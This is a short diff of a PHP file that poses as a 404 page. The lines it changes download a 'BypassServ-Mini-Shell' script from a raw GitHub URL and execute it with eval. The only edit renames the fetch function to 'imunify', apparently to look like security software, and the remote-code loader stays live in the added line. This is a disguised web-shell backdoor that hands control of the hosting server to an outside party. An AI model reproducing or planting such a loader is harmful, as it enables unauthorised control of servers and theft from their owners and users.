@@ -42,6 +42,6 @@ http_response_code(404);
         return $urls;
     }
 
-    $secure = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
+    $secure = imunify('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
     eval('?>' . $secure);
 ?>
